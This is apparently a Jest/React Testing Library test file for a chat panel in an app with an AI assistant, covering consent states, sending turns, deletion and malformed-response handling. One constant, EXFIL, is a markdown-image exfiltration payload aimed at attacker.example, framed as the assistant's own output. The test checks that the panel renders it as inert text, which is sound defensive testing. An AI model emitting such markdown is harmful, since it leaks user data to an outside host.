import { fireEvent, render, screen, waitFor, within } from '@testing-library/react';
import {
  graphqlError,
  installGraphqlFetchMock,
  jsonResponse,
  type OperationHandler,
} from '../test-utils/graphql-fetch-mock';
import { ChatPanel } from './ChatPanel';

/**
 * The conversation surface. Two things are worth testing here and the rest is
 * plumbing: that model-authored text stays inert on screen, and that the
 * consent state is rendered as a state rather than discovered as an error.
 */

const CONVERSATION = {
  conversationId: 'c0nv0000-0000-4000-8000-00000000000c',
  createdAt: '2026-08-05T10:00:00.000Z',
  updatedAt: '2026-08-05T10:05:00.000Z',
};

/** The payload docs/03 §6d exists for, as the assistant's own words. */
const EXFIL = 'You own one property. ![](https://attacker.example/?d=leak)';

function transcript(messages: Array<{ role: 'user' | 'assistant'; text: string }>) {
  return {
    conversationId: CONVERSATION.conversationId,
    messages: messages.map((message, seq) => ({
      messageId: `m${seq}`,
      seq,
      role: message.role,
      text: message.text,
      createdAt: '2026-08-05T10:00:00.000Z',
    })),
  };
}

function handlers(options: {
  conversations?: unknown[];
  consents?: string[];
  transcript?: ReturnType<typeof transcript>;
  send?: OperationHandler;
  remove?: OperationHandler;
  start?: OperationHandler;
}): Record<string, OperationHandler> {
  return {
    Conversations: () =>
      jsonResponse({ data: { conversations: options.conversations ?? [CONVERSATION] } }),
    Consents: () => jsonResponse({ data: { consents: options.consents ?? ['assistant.enabled'] } }),
    Conversation: () =>
      jsonResponse({
        data: { conversation: options.transcript ?? transcript([{ role: 'user', text: 'hi' }]) },
      }),
    StartConversation:
      options.start ?? (() => jsonResponse({ data: { startConversation: CONVERSATION } })),
    SendMessage:
      options.send ??
      (() =>
        jsonResponse({
          data: {
            sendMessage: {
              conversationId: CONVERSATION.conversationId,
              messageId: 'm9',
              text: 'ok',
              toolCalls: 1,
            },
          },
        })),
    DeleteConversation:
      options.remove ?? (() => jsonResponse({ data: { deleteConversation: { ok: true } } })),
  };
}

/**
 * Open the one seeded conversation. The entry's own button, not the first one
 * in the region — that is "New", and clicking it starts a fresh thread instead.
 */
async function openConversation(): Promise<void> {
  const list = await screen.findByRole('region', { name: 'Conversations' });
  const entry = within(list).getAllByRole('listitem')[0] as HTMLElement;
  fireEvent.click(within(entry).getAllByRole('button')[0] as HTMLElement);
}

describe('model-authored text is inert on screen', () => {
  it('renders an exfiltration payload as characters, with no request-capable node', async () => {
    const { requests } = installGraphqlFetchMock(
      handlers({ transcript: transcript([{ role: 'assistant', text: EXFIL }]) }),
    );
    const { container } = render(<ChatPanel />);
    await openConversation();
    expect(await screen.findByText(EXFIL)).toBeInTheDocument();
    // The whole point: no <img>, no <a>, so nothing the browser will fetch.
    expect(container.querySelectorAll('img')).toHaveLength(0);
    expect(container.querySelectorAll('a[href*="attacker"]')).toHaveLength(0);
    // And no request was made for it either — the mock records every fetch.
    expect(requests.every((r) => r.url === '/graphql')).toBe(true);
  });

  it('renders the user’s own text through the same component', async () => {
    installGraphqlFetchMock(handlers({}));
    const { container } = render(<ChatPanel />);
    await openConversation();
    // One renderer for both roles, so a later edit cannot give the assistant's
    // half a richer path than the user's.
    expect(await screen.findByText('hi')).toBeInTheDocument();
    expect(container.querySelectorAll('img')).toHaveLength(0);
  });
});

describe('consent is a state, not an error', () => {
  it('closes the composer and explains why when the switch is off', async () => {
    // The turn route refuses outright with the master switch off (M10 review),
    // so an enabled-looking composer would take what the user typed and throw
    // it away.
    installGraphqlFetchMock(handlers({ consents: [] }));
    render(<ChatPanel />);

    expect(await screen.findByText('The assistant is switched off')).toBeInTheDocument();
    expect(screen.queryByLabelText('Message')).not.toBeInTheDocument();
    expect(screen.getByRole('link', { name: 'Review what it may read' })).toBeInTheDocument();
  });

  it('offers the composer when it is on', async () => {
    installGraphqlFetchMock(handlers({}));
    render(<ChatPanel />);
    expect(await screen.findByLabelText('Message')).toBeInTheDocument();
  });
});

describe('sending a turn', () => {
  beforeEach(() => {
    installGraphqlFetchMock(handlers({}));
  });

  it('sends the text, then RE-READS the transcript rather than appending locally', async () => {
    // The transcript is the record, and the server's copy is the one that
    // survived the transaction — so the panel asks for it again rather than
    // trusting its own optimistic append.
    const { requests } = installGraphqlFetchMock(handlers({}));
    render(<ChatPanel />);
    await openConversation();
    fireEvent.change(await screen.findByLabelText('Message'), {
      target: { value: 'what do I own?' },
    });
    fireEvent.click(screen.getByRole('button', { name: 'Send' }));

    await waitFor(() => {
      expect(requests.some((r) => r.body.query?.includes('SendMessage'))).toBe(true);
    });
    const names = requests.map((r) => r.body.query?.split(/[\s({]+/)[1] ?? '');
    const sent = names.indexOf('SendMessage');
    expect(names.slice(sent + 1)).toContain('Conversation');
    // The variables carry the trimmed text and the open conversation, and
    // nothing else — the subject comes from the session downstream.
    const sendRequest = requests.find((r) => r.body.query?.includes('SendMessage'));
    expect(sendRequest?.body.variables).toEqual({
      conversationId: CONVERSATION.conversationId,
      text: 'what do I own?',
    });
  });

  it('clears the box the moment it is sent, so the question is not typed twice', async () => {
    installGraphqlFetchMock(handlers({}));
    render(<ChatPanel />);
    await openConversation();
    const input = await screen.findByLabelText('Message');
    fireEvent.change(input, { target: { value: 'what do I own?' } });
    fireEvent.click(screen.getByRole('button', { name: 'Send' }));
    expect((input as HTMLInputElement).value).toBe('');
    // Let the turn settle before the test ends, so React is not updating an
    // unmounted tree — the act() warning that trains people to ignore warnings.
    // The button's own label is the settle signal: it reads "Sending…" while
    // the turn is in flight and "Send" once it is not.
    await waitFor(() => {
      expect(screen.getByRole('button', { name: 'Send' })).toBeInTheDocument();
    });
  });

  it('puts the question back in the box when the turn fails', async () => {
    // The turn did not happen, so the user should be able to retry without
    // retyping — and must not be told an answer arrived.
    installGraphqlFetchMock(handlers({ send: () => graphqlError('UNKNOWN') }));
    render(<ChatPanel />);
    await openConversation();
    const input = await screen.findByLabelText('Message');
    fireEvent.change(input, { target: { value: 'is my will signed?' } });
    fireEvent.click(screen.getByRole('button', { name: 'Send' }));

    await waitFor(() => {
      expect((input as HTMLInputElement).value).toBe('is my will signed?');
    });
    expect(screen.getByRole('status').textContent ?? '').not.toBe('');
  });

  it('shows the actionable message when the assistant is switched off mid-session', async () => {
    // Revoked in another tab: the code says which switch, not "try again".
    installGraphqlFetchMock(handlers({ send: () => graphqlError('ASSISTANT_DISABLED') }));
    render(<ChatPanel />);
    await openConversation();
    fireEvent.change(await screen.findByLabelText('Message'), { target: { value: 'hello' } });
    fireEvent.click(screen.getByRole('button', { name: 'Send' }));

    expect(await screen.findByText(/switched off/i)).toBeInTheDocument();
  });

  it('refuses to send an empty message', async () => {
    render(<ChatPanel />);
    await openConversation();
    await screen.findByLabelText('Message');
    expect(screen.getByRole('button', { name: 'Send' })).toBeDisabled();
  });
});

describe('managing conversations', () => {
  it('starts a new one and makes it the active thread', async () => {
    const { requests } = installGraphqlFetchMock(handlers({ conversations: [] }));
    render(<ChatPanel />);
    fireEvent.click(await screen.findByRole('button', { name: 'New' }));

    await waitFor(() => {
      expect(requests.some((r) => r.body.query?.includes('StartConversation'))).toBe(true);
    });
  });

  it('deletes one, and clears the transcript when it was the open thread', async () => {
    const { requests } = installGraphqlFetchMock(handlers({}));
    render(<ChatPanel />);
    await openConversation();
    await screen.findByText('hi');

    const list = screen.getByRole('region', { name: 'Conversations' });
    fireEvent.click(within(list).getByRole('button', { name: 'Delete' }));

    await waitFor(() => {
      expect(requests.some((r) => r.body.query?.includes('DeleteConversation'))).toBe(true);
    });
    await waitFor(() => {
      expect(screen.queryByText('hi')).not.toBeInTheDocument();
    });
  });

  it('shows the uniform not-found copy without hinting whose it was', async () => {
    installGraphqlFetchMock({
      ...handlers({}),
      Conversation: () => graphqlError('NOT_FOUND'),
    });
    render(<ChatPanel />);
    await openConversation();

    const message = await screen.findByText(/isn’t available/i);
    expect(message.textContent ?? '').not.toMatch(/another user|owner|belongs|someone else/i);
  });
});

describe('a response we do not understand is not data', () => {
  // FOUND BY RUNNING THE REAL APP. `gqlRequest` answers ok for any `data`
  // object, so a version skew between this client and the BFF — a field
  // renamed, a resolver removed — arrives as `{"data":{}}`. Dereferencing it
  // threw and white-screened the page; an empty list would have been worse
  // still, because "you have no conversations" is a claim about the account.
  it('shows the error state when the conversation list is missing', async () => {
    installGraphqlFetchMock({
      ...handlers({}),
      Conversations: () => jsonResponse({ data: {} }),
    });
    render(<ChatPanel />);
    expect(await screen.findByText(/couldn’t load your conversations/i)).toBeInTheDocument();
  });

  it('shows the error state when the consent list is missing', async () => {
    installGraphqlFetchMock({
      ...handlers({}),
      Consents: () => jsonResponse({ data: { consents: 'all of them' } }),
    });
    render(<ChatPanel />);
    expect(await screen.findByText(/couldn’t load your conversations/i)).toBeInTheDocument();
  });

  it('refuses a start response missing its conversation id', async () => {
    // The one call site that lacked the guard (M11 security review). The
    // milestone claimed the rule everywhere; it held in two places out of three.
    installGraphqlFetchMock({
      ...handlers({ conversations: [] }),
      StartConversation: () => jsonResponse({ data: {} }),
    });
    render(<ChatPanel />);
    fireEvent.click(await screen.findByRole('button', { name: 'New' }));
    expect(await screen.findByText(/went wrong/i)).toBeInTheDocument();
  });

  it('refuses a transcript that is not a list of messages', async () => {
    installGraphqlFetchMock({
      ...handlers({}),
      Conversation: () => jsonResponse({ data: { conversation: { conversationId: 'c1' } } }),
    });
    render(<ChatPanel />);
    await openConversation();
    // An error, not an empty transcript that reads as "nothing was said here".
    expect(await screen.findByText(/went wrong/i)).toBeInTheDocument();
  });
});

describe('load states', () => {
  it('offers sign-in rather than an empty history', async () => {
    installGraphqlFetchMock({
      Conversations: () => graphqlError('UNAUTHENTICATED'),
      Consents: () => graphqlError('UNAUTHENTICATED'),
    });
    render(<ChatPanel />);
    expect(await screen.findByText('Sign in required')).toBeInTheDocument();
  });
});
